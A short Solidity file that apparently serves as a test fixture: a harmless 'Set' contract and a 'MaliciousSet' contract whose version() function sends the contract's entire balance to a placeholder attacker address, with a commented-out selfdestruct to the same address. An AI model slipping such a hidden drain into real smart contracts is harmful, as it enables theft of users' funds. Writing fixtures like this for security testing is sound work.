// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.2;

contract Set {
    function version() public returns (uint) {
        return 1;
    }
}

contract MaliciousSet {
    address constant attackerAddr = address(0x42);

    function version() public returns (uint) {
        payable(attackerAddr).send(address(this).balance);
        // selfdestruct(payable(attackerAddr));
        return 1;
    }
}